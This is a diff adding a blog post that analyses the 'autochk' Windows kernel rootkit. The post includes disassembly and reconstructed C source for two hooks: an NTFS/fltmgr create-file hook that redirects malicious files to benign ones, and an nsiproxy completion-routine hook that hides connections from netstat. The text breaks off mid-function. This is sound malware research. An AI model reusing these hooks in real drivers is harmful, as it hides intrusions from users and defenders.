@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+  <link href="https://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="generator" content="Hugo 0.58.3" />
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Autochk Rootkit Analysis &middot; Low Level Pleasure</title>
+  <meta name="description" content="" />
+
+  
+  <link type="text/css" rel="stylesheet" href="/css/print.css" media="print">
+  <link type="text/css" rel="stylesheet" href="/css/poole.css">
+  <link type="text/css" rel="stylesheet" href="/css/syntax.css">
+  <link type="text/css" rel="stylesheet" href="/css/hyde.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface|PT+Sans:400,400i,700">
+
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" href="/favicon.png">
+
+  
+  
+</head>
+
+  <body class=" ">
+  <aside class="sidebar">
+  <div class="container">
+    <div class="sidebar-about">
+      <a href="/"><h1>Low Level Pleasure</h1></a>
+      <p class="lead">
+       Ori Damari&#39;s (repnz) blog about Windows Internals, Reversing, Malware, Software Development 
+      </p>
+    </div>
+    <nav>
+      <ul class="sidebar-nav">
+        <li><a href="https://repnz.github.io">Home</a> </li>
+        <li><a href="/about" > About Me </a></li><li><a href="/posts" > Archive </a></li><li><a href="/tags" > Tags </a></li><li><a href="https://github.com/repnz/"  target="_blank" > Github (/repnz) </a></li><li><a href="https://twitter.com/0xrepnz"  target="_blank" > Twitter (0xrepnz) </a></li>
+      </ul>
+    </nav>
+    <p>&copy; 2020. All rights reserved. </p>
+  </div>
+</aside>
+
+    <main class="content container">
+    <div class="post">
+  <h1>Autochk Rootkit Analysis</h1>
+  <time datetime=2019-11-01T14:00:00&#43;0300 class="post-date">Fri, Nov 1, 2019</time>
+  <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#the-developer-of-this-rootkit">The Developer Of This Rootkit</a></li>
+<li><a href="#file-redirection">File Redirection</a></li>
+<li><a href="#network-connections-hiding">Network Connections Hiding</a></li>
+<li><a href="#autochk-controller">Autochk Controller</a></li>
+<li><a href="#funny-stuff">Funny Stuff</a></li>
+<li><a href="#summary">Summary</a></li>
+</ul></li>
+</ul>
+</nav>
+  
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Finally had time to write about this rootkit I saw last week. This rootkit is a very simple, it does not employ any uber fancy
+methods or something, but I do find it nice so I wanted to share. The name of the driver is &ldquo;autochk.sys&rdquo; - that&rsquo;s why we&rsquo;ll
+call it the autochk rootkit. The sample is already known (<a href="https://www.virustotal.com/gui/file/28924b6329f5410a5cca30f3530a3fb8a97c23c9509a192f2092cbdf139a91d8/detection">28924b6329f5410a5cca30f3530a3fb8a97c23c9509a192f2092cbdf139a91d8</a>), but I haven&rsquo;t found any public analysis.
+The rootkit was compiled on the 27/8/2017 according to the PE timestamp.</p>
+
+<p>The rootkit implements 2 functionalities:</p>
+
+<ul>
+<li><strong>File Redirection</strong> - Redirect malicious files to benign files. If you try to call CreateFile() to open a malicious file
+you&rsquo;ll get a handle to a benign file.</li>
+<li><strong>Network Connection Hiding</strong> - Hide network connections from tools like netstat.</li>
+</ul>
+
+<p>The rootkit is signed and it works on windows 10 (tested on 10.0.17763) - it is important to say that although it is signed, it won&rsquo;t load into a latest windows
+system because it is not signed by Microsoft.
+The rootkit is not that big, So I reconstructed its <a href="https://github.com/repnz/autochk-rootkit">source code</a> (<em>without using the decompiler, just to see some
+<a href="/posts/reversing-optimizations-division">optimizations</a> in my own eyes:)</em> (I&rsquo;ll write a post about the dilema of using a
+decompiler soon..)).
+I also created a &ldquo;controller&rdquo; that can load this rootkit and add hidden connections / redirected files.</p>
+
+<h2 id="the-developer-of-this-rootkit">The Developer Of This Rootkit</h2>
+
+<p>The attacker is called &ldquo;Emissary Panda&rdquo; and according to <a href="https://malpedia.caad.fkie.fraunhofer.de/actor/emissary_panda">malpedia</a> it is &ldquo;<em>A China-based actor that targets foreign embassies to collect data on government, defence, and technology sectors.</em>&rdquo;. Well, the only purpose of this blog is to describe the techniques of the rootkit.</p>
+
+<p>I&rsquo;ll just say it is signed by &ldquo;Hangzhou Bianfeng Networking Technology Co., Ltd&rdquo; which is a chinese software company.</p>
+
+<h2 id="file-redirection">File Redirection</h2>
+
+<p>The rootkit uses IRP hooking to redirect files in the file system. This is mainly used to hide the files of the malware. The rootkit
+has a hardcoded list of files, and also allows a user mode caller to add files to that list via DeviceIoControl.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">push    rbx
+sub     rsp, <span style="color:#ae81ff">40</span>h
+lea     rdx, SourceString ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">FileSystem</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Ntfs&#34;</span>
+lea     rcx, [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h<span style="color:#f92672">+</span>NtfsDriverName] ; DestinationString
+call    cs:RtlInitUnicodeString
+lea     rdx, TargetFile ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">WINDOWS</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">DRIVERS</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">fltMgr.sy&#34;</span>...
+lea     rcx, OriginalFileName ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">WINDOWS</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">DRIVERS</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">autochk.s&#34;</span>...
+call    FsAddFileRedirection
+lea     rbx, aWindowsSystem3 ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">shlwapi.dll&#34;</span>
+lea     rcx, SourceFile ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">odbcwg32.cpl&#34;</span>
+mov     rdx, rbx        ; TargetFile
+call    FsAddFileRedirection
+lea     rcx, aWindowsSystem3_1 ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">c_21268.nls&#34;</span>
+mov     rdx, rbx        ; TargetFile
+call    FsAddFileRedirection
+lea     rcx, aWindowsSystem3_2 ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">cliconfg.cpl&#34;</span>
+mov     rdx, rbx        ; TargetFile
+call    FsAddFileRedirection
+lea     rcx, aWindowsSystem3_3 ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">imekr61.dll&#34;</span>
+mov     rdx, rbx        ; TargetFile
+call    FsAddFileRedirection
+lea     rcx, aWindowsSystem3_4 ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">PINTLGNT.dll&#34;</span>
+mov     rdx, rbx        ; TargetFile
+call    FsAddFileRedirection
+lea     rcx, aWindowsSystem3_5 ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">chrsben.ime&#34;</span>
+mov     rdx, rbx        ; TargetFile
+call    FsAddFileRedirection
+lea     rcx, aWindowsSystem3_6 ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">bitsprx.ime&#34;</span>
+mov     rdx, rbx        ; TargetFile
+call    FsAddFileRedirection
+lea     rcx, aWindowsSystem3_7 ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">C_1950.NLS&#34;</span>
+mov     rdx, rbx        ; TargetFile
+call    FsAddFileRedirection
+lea     rcx, aWindowsSystem3_31 ; <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">C_26849.NLS&#34;</span>
+mov     rdx, rbx        ; TargetFile
+call    FsAddFileRedirection
+.....................
+....................</code></pre></div>
+
+<p>The rootkit replaces the IRP handler of CreateFile of the fltmgr.sys driver:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">HookDriverObject <span style="color:#f92672">=</span> FsGetDriverToHook(FileSystemDriver);
+	
+<span style="color:#66d9ef">if</span> (HookDriverObject <span style="color:#f92672">==</span> NULL)
+{
+    Status <span style="color:#f92672">=</span> STATUS_SUCCESS;
+    <span style="color:#66d9ef">goto</span> clean;
+}
+
+<span style="color:#66d9ef">if</span> (EnableHook)
+{
+    <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// ...
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>    g_FsOriginalCreateFileDispatcher <span style="color:#f92672">=</span> HookDriverObject<span style="color:#f92672">-&gt;</span>MajorFunction[IRP_MJ_CREATE];
+    HookDriverObject<span style="color:#f92672">-&gt;</span>MajorFunction[IRP_MJ_CREATE] <span style="color:#f92672">=</span> FsCreateFileHook;
+}
+<span style="color:#66d9ef">else</span>
+{
+    HookDriverObject<span style="color:#f92672">-&gt;</span>MajorFunction[IRP_MJ_CREATE] <span style="color:#f92672">=</span> g_FsOriginalCreateFileDispatcher;
+}</code></pre></div>
+
+<p>Let&rsquo;s look at the context this hook is called:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#ae81ff">00</span> AutochkRootkit<span style="color:#f92672">!</span>FsCreateFileHook
+<span style="color:#ae81ff">01</span> nt<span style="color:#f92672">!</span>IofCallDriver
+<span style="color:#ae81ff">02</span> nt<span style="color:#f92672">!</span>IoCallDriverWithTracing
+<span style="color:#ae81ff">03</span> nt<span style="color:#f92672">!</span>IopParseDevice
+<span style="color:#ae81ff">04</span> nt<span style="color:#f92672">!</span>ObpLookupObjectName
+<span style="color:#ae81ff">05</span> nt<span style="color:#f92672">!</span>ObOpenObjectByNameEx
+<span style="color:#ae81ff">06</span> nt<span style="color:#f92672">!</span>IopCreateFile
+<span style="color:#ae81ff">07</span> nt<span style="color:#f92672">!</span>NtCreateFile
+<span style="color:#ae81ff">08</span> nt<span style="color:#f92672">!</span>KiSystemServiceCopyEnd
+<span style="color:#ae81ff">09</span> ntdll<span style="color:#f92672">!</span>NtCreateFile
+<span style="color:#ae81ff">0</span>a KERNELBASE<span style="color:#f92672">!</span>CreateFileInternal
+<span style="color:#ae81ff">0</span>b KERNELBASE<span style="color:#f92672">!</span>CreateFileW
+<span style="color:#ae81ff">0</span>c winmm<span style="color:#f92672">!</span>MatchFile
+<span style="color:#ae81ff">0</span>d winmm<span style="color:#f92672">!</span>sndMessage
+<span style="color:#ae81ff">0</span>e winmm<span style="color:#f92672">!</span>mmWndProc
+<span style="color:#ae81ff">0f</span> USER32<span style="color:#f92672">!</span>UserCallWinProcCheckWow
+<span style="color:#ae81ff">10</span> USER32<span style="color:#f92672">!</span>DispatchMessageWorker
+<span style="color:#ae81ff">11</span> winmm<span style="color:#f92672">!</span>mciwindow
+<span style="color:#ae81ff">12</span> KERNEL32<span style="color:#f92672">!</span>BaseThreadInitThunk
+<span style="color:#ae81ff">13</span> ntdll<span style="color:#f92672">!</span>RtlUserThreadStart</code></pre></div>
+
+<p>In this stack trace we can see a user mode caller called <code>CreateFileW</code> and that triggered the hook.</p>
+
+<p>This is the code of the hook:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">static</span> NTSTATUS <span style="color:#a6e22e">FsCreateFileHook</span>(PDEVICE_OBJECT DeviceObject, PIRP Irp)
+{
+	WCHAR RedirectionTarget[<span style="color:#ae81ff">260</span>];
+	PIO_STACK_LOCATION IoStackLocation <span style="color:#f92672">=</span> IoGetCurrentIrpStackLocation(Irp);
+	PUNICODE_STRING FileObjectName;
+
+	<span style="color:#75715e">//
+</span><span style="color:#75715e"></span>	<span style="color:#75715e">// Verify values are not NULL and this is the correct IRQL
+</span><span style="color:#75715e"></span>	<span style="color:#75715e">//
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (
+		(IoStackLocation <span style="color:#f92672">==</span> NULL) <span style="color:#f92672">||</span> 
+		(IoStackLocation<span style="color:#f92672">-&gt;</span>FileObject <span style="color:#f92672">==</span> NULL) <span style="color:#f92672">||</span> 
+		(KeGetCurrentIrql() <span style="color:#f92672">!=</span> PASSIVE_LEVEL)
+	)
+	{
+		<span style="color:#66d9ef">goto</span> exit;
+	}
+
+	FileObjectName <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>IoStackLocation<span style="color:#f92672">-&gt;</span>FileObject<span style="color:#f92672">-&gt;</span>FileName;
+
+	RtlZeroMemory(RedirectionTarget, <span style="color:#ae81ff">520</span>);
+	
+    <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// This function checks if the file is redirected.
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// If it is, STATUS_SUCCESS is returned and the RedirectionTarget is filled
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// with the target file path
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (FsGetRedirectionTarget(FileObjectName<span style="color:#f92672">-&gt;</span>Buffer, RedirectionTarget) <span style="color:#f92672">!=</span> STATUS_SUCCESS)
+	{
+		<span style="color:#66d9ef">goto</span> exit;
+	}
+	
+	<span style="color:#75715e">//
+</span><span style="color:#75715e"></span>	<span style="color:#75715e">// Look if this process should be ignored
+</span><span style="color:#75715e"></span>	<span style="color:#75715e">//
+</span><span style="color:#75715e"></span>	PCHAR ProcessName <span style="color:#f92672">=</span> PsGetProcessImageFileName(PsGetCurrentProcess());
+
+	<span style="color:#66d9ef">for</span> (ULONG i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">13</span>; i<span style="color:#f92672">++</span>)
+	{
+		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>_stricmp(ProcessName, g_FsHardcodedIgnoredProcessList[i]))
+		{
+			<span style="color:#66d9ef">goto</span> exit;
+		}
+	}
+
+	<span style="color:#66d9ef">for</span> (ULONG i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>)
+	{
+		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>_stricmp(ProcessName, g_FsDynamicIgnoredProcessesList[i]))
+		{
+			<span style="color:#66d9ef">goto</span> exit;
+		}
+	}
+
+    <span style="color:#75715e">// 
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Check if the capacity of the source filename buffer is large enough
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// for the target file
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>	ULONG TargetNameLength <span style="color:#f92672">=</span> (ULONG)wcslen(RedirectionTarget);
+	ULONG ExistingFileNameCapacity <span style="color:#f92672">=</span> (FileObjectName<span style="color:#f92672">-&gt;</span>MaximumLength <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>);
+
+	<span style="color:#66d9ef">if</span> (ExistingFileNameCapacity <span style="color:#f92672">&lt;=</span> TargetNameLength)
+	{
+        <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>        <span style="color:#75715e">// Allocate new memory for the target file
+</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>		PVOID NewFileName <span style="color:#f92672">=</span> ExAllocatePoolWithTag(NonPagedPool, <span style="color:#ae81ff">520</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span>pf<span style="color:#960050;background-color:#1e0010">&#39;</span>);
+
+		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NewFileName)
+		{
+			<span style="color:#66d9ef">goto</span> exit;
+		}
+
+		RtlZeroMemory(NewFileName, <span style="color:#ae81ff">520</span>);
+		RtlMoveMemory(NewFileName, RedirectionTarget, TargetNameLength);
+
+		FileObjectName<span style="color:#f92672">-&gt;</span>Buffer <span style="color:#f92672">=</span> NewFileName;
+		FileObjectName<span style="color:#f92672">-&gt;</span>MaximumLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">520</span>;
+		FileObjectName<span style="color:#f92672">-&gt;</span>Length <span style="color:#f92672">=</span> (USHORT) (wcslen(NewFileName) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>);
+	}
+	<span style="color:#66d9ef">else</span>
+	{
+        <span style="color:#75715e">// Enough! Copy the memory to the original buffer
+</span><span style="color:#75715e"></span>		RtlZeroMemory(FileObjectName<span style="color:#f92672">-&gt;</span>Buffer, FileObjectName<span style="color:#f92672">-&gt;</span>MaximumLength);
+		RtlMoveMemory(FileObjectName<span style="color:#f92672">-&gt;</span>Buffer, RedirectionTarget, TargetNameLength <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>);
+		FileObjectName<span style="color:#f92672">-&gt;</span>Length <span style="color:#f92672">=</span> (USHORT)(TargetNameLength <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>);
+	}
+
+exit:
+	<span style="color:#66d9ef">return</span> g_FsOriginalCreateFileDispatcher(DeviceObject, Irp);
+}</code></pre></div>
+
+<p>If a file is redirected, <code>RedirectionTarget</code> contains the name of the target file.
+After that, the original file name inside the IRP file object is replaced.</p>
+
+<h2 id="network-connections-hiding">Network Connections Hiding</h2>
+
+<p>The purpose of this mechanism is to hide connections from tools like netstat.exe. netstat works by calling <code>InternalGetTcpTable2()</code> (similar to <a href="https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-gettcptable">GetTcpTable()</a>) which eventually sends a DeviceIoControl request to <code>\Device\Nsi</code>.
+The rootkit hooks the DeviceIoControl handler of nsiproxy.sys.</p>
+
+<p>Let&rsquo;s look at the call stack:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#ae81ff">00</span> AutochkRootkit<span style="color:#f92672">!</span>NetNsiProxyDeviceControlHook
+<span style="color:#ae81ff">01</span> nt<span style="color:#f92672">!</span>IofCallDriver
+<span style="color:#ae81ff">02</span> nt<span style="color:#f92672">!</span>IopSynchronousServiceTail
+<span style="color:#ae81ff">03</span> nt<span style="color:#f92672">!</span>IopXxxControlFile
+<span style="color:#ae81ff">04</span> nt<span style="color:#f92672">!</span>NtDeviceIoControlFile
+<span style="color:#ae81ff">05</span> nt<span style="color:#f92672">!</span>KiSystemServiceCopyEnd
+<span style="color:#ae81ff">06</span> ntdll<span style="color:#f92672">!</span>NtDeviceIoControlFile
+<span style="color:#ae81ff">07</span> NSI<span style="color:#f92672">!</span>NsiAllocateAndGetTable
+<span style="color:#ae81ff">08</span> IPHLPAPI<span style="color:#f92672">!</span>GetTcpTableInternal
+<span style="color:#ae81ff">09</span> IPHLPAPI<span style="color:#f92672">!</span>GetTcpTable2
+<span style="color:#ae81ff">0</span>a IPHLPAPI<span style="color:#f92672">!</span>InternalGetTable
+<span style="color:#ae81ff">0</span>b IPHLPAPI<span style="color:#f92672">!</span>InternalGetTcpTable2
+<span style="color:#ae81ff">0</span>c NETSTAT<span style="color:#f92672">!</span>DoConnections
+<span style="color:#ae81ff">0</span>d NETSTAT<span style="color:#f92672">!</span>main
+<span style="color:#ae81ff">0</span>e NETSTAT<span style="color:#f92672">!</span>__mainCRTStartup
+<span style="color:#ae81ff">0f</span> KERNEL32<span style="color:#f92672">!</span>BaseThreadInitThunk
+<span style="color:#ae81ff">10</span> ntdll<span style="color:#f92672">!</span>RtlUserThreadStart</code></pre></div>
+
+<p>This is the code of the hook -
+Because the rootkit needs to change the response of the IO request, it hooks the IO completion routine:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">NTSTATUS <span style="color:#a6e22e">NetNsiProxyDeviceControlHook</span>(PDEVICE_OBJECT DeviceObject, PIRP Irp)
+{
+
+	PIO_STACK_LOCATION IoStackLocation <span style="color:#f92672">=</span> IoGetCurrentIrpStackLocation(Irp);
+
+	<span style="color:#66d9ef">if</span> (IoStackLocation<span style="color:#f92672">-&gt;</span>Parameters.DeviceIoControl.IoControlCode <span style="color:#f92672">==</span> IOCTL_NSI_QUERY)
+	{
+        <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>        <span style="color:#75715e">// Allocate a structure to save the original IO completion routine and context
+</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>		PHOOKED_IO_COMPLETION Hook <span style="color:#f92672">=</span> (PHOOKED_IO_COMPLETION)ExAllocatePool(NonPagedPool, <span style="color:#66d9ef">sizeof</span>(HOOKED_IO_COMPLETION));
+
+		Hook<span style="color:#f92672">-&gt;</span>OriginalCompletionRoutine <span style="color:#f92672">=</span> IoStackLocation<span style="color:#f92672">-&gt;</span>CompletionRoutine;
+		Hook<span style="color:#f92672">-&gt;</span>OriginalContext <span style="color:#f92672">=</span> IoStackLocation<span style="color:#f92672">-&gt;</span>Context;
+
+        <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>        <span style="color:#75715e">// Replace the original routine and context
+</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>		IoStackLocation<span style="color:#f92672">-&gt;</span>Context <span style="color:#f92672">=</span> Hook;
+		IoStackLocation<span style="color:#f92672">-&gt;</span>CompletionRoutine <span style="color:#f92672">=</span> NetNsiProxyCompletionRoutine;
+
+		Hook<span style="color:#f92672">-&gt;</span>RequestingProcess <span style="color:#f92672">=</span> PsGetCurrentProcess();
+		Hook<span style="color:#f92672">-&gt;</span>InvokeOnSuccess <span style="color:#f92672">=</span> (IoStackLocation<span style="color:#f92672">-&gt;</span>Control <span style="color:#f92672">&amp;</span> SL_INVOKE_ON_SUCCESS) <span style="color:#f92672">?</span> TRUE : FALSE;
+
+		IoStackLocation<span style="color:#f92672">-&gt;</span>Control <span style="color:#f92672">|=</span> SL_INVOKE_ON_SUCCESS;
+	}
+
+	<span style="color:#66d9ef">return</span> g_NetOldNsiProxyDeviceControl(DeviceObject, Irp);
+}</code></pre></div>
+
+<p>The IO completion routine is called when <code>IoCompleteRequest()</code> is called to complete the IRP:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#ae81ff">00</span> AutochkRootkit<span style="color:#f92672">!</span>NetNsiProxyCompletionRoutine
+<span style="color:#ae81ff">01</span> nt<span style="color:#f92672">!</span>IopfCompleteRequest
+<span style="color:#ae81ff">02</span> nt<span style="color:#f92672">!</span>IofCompleteRequest
+<span style="color:#ae81ff">03</span> nsiproxy<span style="color:#f92672">!</span>NsippDispatch
+<span style="color:#ae81ff">04</span> AutochkRootkit<span style="color:#f92672">!</span>NetNsiProxyDeviceControlHook
+<span style="color:#ae81ff">05</span> nt<span style="color:#f92672">!</span>IofCallDriver
+<span style="color:#ae81ff">06</span> nt<span style="color:#f92672">!</span>IopSynchronousServiceTail
+<span style="color:#ae81ff">07</span> nt<span style="color:#f92672">!</span>IopXxxControlFile
+<span style="color:#ae81ff">08</span> nt<span style="color:#f92672">!</span>NtDeviceIoControlFile
+<span style="color:#ae81ff">09</span> nt<span style="color:#f92672">!</span>KiSystemServiceCopyEnd
+<span style="color:#ae81ff">0</span>a ntdll<span style="color:#f92672">!</span>NtDeviceIoControlFile
+<span style="color:#ae81ff">0</span>b NSI<span style="color:#f92672">!</span>NsiAllocateAndGetTable
+<span style="color:#ae81ff">0</span>c IPHLPAPI<span style="color:#f92672">!</span>GetTcpTableInternal
+<span style="color:#ae81ff">0</span>d IPHLPAPI<span style="color:#f92672">!</span>GetTcpTable2
+<span style="color:#ae81ff">0</span>e IPHLPAPI<span style="color:#f92672">!</span>InternalGetTable
+<span style="color:#ae81ff">0f</span> IPHLPAPI<span style="color:#f92672">!</span>InternalGetTcpTable2
+<span style="color:#ae81ff">10</span> NETSTAT<span style="color:#f92672">!</span>DoConnections
+<span style="color:#ae81ff">11</span> NETSTAT<span style="color:#f92672">!</span>main
+<span style="color:#ae81ff">12</span> NETSTAT<span style="color:#f92672">!</span>__mainCRTStartup
+<span style="color:#ae81ff">13</span> KERNEL32<span style="color:#f92672">!</span>BaseThreadInitThunk
+<span style="color:#ae81ff">14</span> ntdll<span style="color:#f92672">!</span>RtlUserThreadStart</code></pre></div>
+
+<p>Inside the completion routine, the rootkit checks if the IP address is protected or not. If it is, it zeros
+that entry inside the NSI structure.</p>
+
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">NTSTATUS <span style="color:#a6e22e">NetNsiProxyCompletionRoutine</span>(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
+{
+	PHOOKED_IO_COMPLETION HookedContext <span style="color:#f92672">=</span> (PHOOKED_IO_COMPLETION)Context;
+
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(Irp<span style="color:#f92672">-&gt;</span>IoStatus.Status))
+	{
+		<span style="color:#66d9ef">goto</span> free_exit;
+	}
+
+    <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Undocumented structure.
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>	PNSI_STRUCTURE_1 NsiStructure1 <span style="color:#f92672">=</span> (PNSI_STRUCTURE_1)Irp<span style="color:#f92672">-&gt;</span>UserBuffer;
+
+    <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// I restored the members based on the offsets in the rootkit
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (MmIsAddressValid(NsiStructure1<span style="color:#f92672">-&gt;</span>Entries) <span style="color:#f92672">&amp;&amp;</span> NsiStructure1<span style="color:#f92672">-&gt;</span>EntrySize <span style="color:#f92672">==</span> <span style="color:#66d9ef">sizeof</span>(NSI_STRUCTURE_ENTRY))
+	{
+		KAPC_STATE ApcState;
+
+        KeStackAttachProcess(HookedContext<span style="color:#f92672">-&gt;</span>RequestingProcess, <span style="color:#f92672">&amp;</span>ApcState);
+
+        PNSI_STRUCTURE_ENTRY NsiBufferEntries <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>(NsiStructure1<span style="color:#f92672">-&gt;</span>Entries<span style="color:#f92672">-&gt;</span>EntriesStart[<span style="color:#ae81ff">0</span>]);
+
+        <span style="color:#66d9ef">for</span> (ULONG i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NsiStructure1<span style="color:#f92672">-&gt;</span>NumberOfEntries; i<span style="color:#f92672">++</span>)
+        {
+            <span style="color:#66d9ef">if</span> (NetIsHiddenIpAddress(NsiBufferEntries[i].IpAddress))
+            {
+                RtlZeroMemory(<span style="color:#f92672">&amp;</span>NsiBufferEntries[i], <span style="color:#66d9ef">sizeof</span>(NSI_STRUCTURE_ENTRY));
+
+            }
+        }
+
+        KeUnstackDetachProcess(<span style="color:#f92672">&amp;</span>ApcState);
+	}
+
+	
+......
+......</code></pre></div>
